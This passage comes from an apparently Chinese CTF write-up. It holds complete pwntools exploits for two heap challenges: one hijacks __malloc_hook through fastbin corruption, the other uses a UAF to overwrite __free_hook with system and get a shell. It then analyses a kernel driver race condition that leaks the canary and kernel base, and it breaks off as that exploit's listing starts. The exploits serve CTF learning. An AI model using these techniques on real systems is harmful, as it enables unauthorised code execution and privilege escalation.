process(&#x27;./fog&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;nc.eonew.cn&#x27;</span>, <span class="number">10006</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">data_size, data=<span class="string">b&#x27;\n&#x27;</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What size do you want?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(data_size), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Which one do you want to delete?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, data</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Which one do you want to modify?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What do you want to input?&#x27;</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Which one do you want to see?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 3</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 4</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 5</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 6</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 7</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 8</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 9</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 10</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 11</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 12</span></span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x30</span>+flat(<span class="number">0</span>, <span class="number">0x31</span>))  <span class="comment"># 13</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 14</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x3f0</span>))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 3</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Content : &#x27;</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c4b78</span>+<span class="number">0x29000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 9</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">9</span>, p64(libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 5</span></span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x13</span>+p64(<span class="number">0x3f42a</span>+libc_base))  <span class="comment"># 10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="number">0x3f42a</span>+libc_base))</span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b*$rebase(0xC5D)&#x27;)</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r,&#x27;b*$rebase(0xC5D)&#x27;)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="Time-heap"><a href="#Time-heap" class="headerlink" title="Time heap"></a>Time heap</h2><p>题目非常简单，存在很明显的UAF，这里就不再分析了，直接给exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./time_heap&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./time_heap&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;nc.eonew.cn&#x27;</span>, <span class="number">10015</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, contents, remark</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    r.send(contents)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Remark: &#x27;</span>)</span><br><span class="line">    r.send(remark)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, contents, remark</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    r.send(contents)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Remark: &#x27;</span>)</span><br><span class="line">    r.send(remark)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x400</span>, <span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>, flat([<span class="number">0</span>]*<span class="number">2</span>), <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ecbe0</span>+<span class="number">0x30000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">free_hook = libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(free_hook), flat(<span class="number">0</span>))</span><br><span class="line">create(<span class="number">0x400</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>, flat(system))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(free_hook))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="kernel-pwn2"><a href="#kernel-pwn2" class="headerlink" title="kernel pwn2"></a>kernel pwn2</h2><p>题目比较简单，就是普通的内核栈题</p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">test2_write</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 size; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// r12</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// r12</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, a2, a3);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)((<span class="keyword">int</span>)used + size) &lt;= <span class="number">0x100</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = size;</span><br><span class="line">    msleep(<span class="number">2000LL</span>);</span><br><span class="line">    v8 = (<span class="keyword">char</span> *)&amp;test2_buffer + (<span class="keyword">int</span>)used;</span><br><span class="line">    _check_object_size(v8, v7, <span class="number">0LL</span>);</span><br><span class="line">    copy_from_user(v8, a2, v7);</span><br><span class="line">    result = v7;</span><br><span class="line">    LODWORD(used) = v7 + used;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = (<span class="keyword">char</span> *)&amp;test2_buffer + (<span class="keyword">int</span>)used;</span><br><span class="line">    v5 = <span class="number">0x100</span> - (<span class="keyword">int</span>)used;</span><br><span class="line">    _check_object_size(v4, v5, <span class="number">0LL</span>);</span><br><span class="line">    copy_from_user(v4, a2, v5);</span><br><span class="line">    result = v5;</span><br><span class="line">    LODWORD(used) = <span class="number">0x100</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">test2_read</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))_fentry__)();</span><br><span class="line">  v3 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)used &lt;= size )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">int</span>)used &gt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> ((__int64 (__fastcall *)(__int64))get_buf)(a2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="keyword">int</span>)used &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = size;</span><br><span class="line">    LODWORD(used) = used - size;</span><br><span class="line">    <span class="keyword">if</span> ( size &gt; <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      _warn_printk(<span class="string">&quot;Buffer overflow detected (%d &lt; %lu)!\n&quot;</span>, <span class="number">0x100</span>LL);</span><br><span class="line">      BUG();</span><br><span class="line">    &#125;</span><br><span class="line">    _check_object_size(&amp;test2_buffer, size, <span class="number">1LL</span>);</span><br><span class="line">    copy_to_user(a2, &amp;test2_buffer, v3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">get_buf</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD v4[<span class="number">36</span>]; <span class="comment">// [rsp-120h] [rbp-120h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v4[<span class="number">35</span>] = v2;</span><br><span class="line">  v4[<span class="number">32</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(<span class="keyword">int</span>)used &gt; <span class="number">0x200</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    fortify_panic(<span class="string">&quot;memcpy&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> test2_read((__int64)<span class="string">&quot;memcpy&quot;</span>, a2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(v4, &amp;test2_buffer, (<span class="keyword">int</span>)used);</span><br><span class="line">    msleep(<span class="number">2000LL</span>);</span><br><span class="line">    copy_to_user(a1, v4, used);</span><br><span class="line">    result = (<span class="keyword">int</span>)used;</span><br><span class="line">    LODWORD(used) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是驱动比较重要的三个函数。</p><p>在<code>get_buf</code>函数中会将全局变量的内容复制到栈上，然后再将栈上的内容发送给用户态。从头到尾其实看不出来什么问题，不过题目这里用<code>msleep</code>函数就已经算是明示存在条件竞争了。</p><h3 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h3><p>如果我们可以在<code>get_buf</code>中<code>memcpy</code>之后以及<code>copy_to_user</code>之前就可以泄漏出栈上的内容。</p><p>具体的办法就是两个线程分别write并且分别进入if内的代码块和else内的代码块，首先在<code>memcpy</code>执行之前进入else的代码块修改used的为0x100，随后在<code>copy_to_user</code>之前执行完if内的代码块，那么此时used为<code>0x100+size</code>，所以此时可以泄漏出canary和kernel基地址了。</p><p>有了上面泄漏的思路之后实现栈溢出也就很简单了这里就不提了</p><h3 id="综上，exp-2"><a href="#综上，exp-2" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span 